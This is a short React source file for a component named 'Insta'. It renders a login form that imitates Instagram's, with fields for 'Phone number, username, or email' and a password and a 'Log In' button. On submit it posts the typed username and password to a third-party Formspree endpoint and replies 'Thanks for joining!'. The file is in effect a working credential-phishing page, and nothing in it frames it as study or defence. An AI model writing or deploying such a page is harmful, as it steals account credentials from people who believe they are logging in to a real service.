// Make sure to run npm install @formspree/react
// For more help visit https://formspr.ee/react-help
import React from 'react';
import { useForm, ValidationError } from '@formspree/react';
function Insta() {
  const [state, handleSubmit] = useForm("xbjejpyv");
  if (state.succeeded) {
      return <p>Thanks for joining!</p>;
  }
  return (
      <form onSubmit={handleSubmit}>
<div class="input-box">
      <input type="text"
               id="name" 
        placeholder="Phone number, username, or email"
    autocapitalize="off"
       autocorrect="off" 
              name="username" />
                    </div>  
<div class="input-box">
                     
 <input type="password" 
        name="password"
          id="password" 
 placeholder="Password" 
aria-describedby="" 
maxlength="30" 
aria-required="true" 
autocapitalize="off" 
autocorrect="off" />
                    </div>
<centre>
      <button align="centre" class="btn" type="submit" disabled={state.submitting}>
        Log In
      </button>
</centre>
    </form>
  );
}
function App() {
  return (
    <Insta />
  );
}
export default App;
